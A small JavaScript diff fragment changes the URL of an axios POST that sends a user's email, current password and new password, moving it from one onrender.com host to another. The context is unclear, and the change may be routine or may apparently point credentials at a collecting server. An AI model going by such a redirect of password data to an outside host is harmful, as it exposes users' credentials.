@@ -41,7 +41,7 @@ let passi;
 function shaneh () {
           passwordx = passwordx.trim();
    axios
-  .post('https://strapi-k4vr.onrender.com/password', {
+  .post('https://oneloveone.onrender.com/password', {
      identifier: mail,
     password: passi,
     newPassword: passwordx,
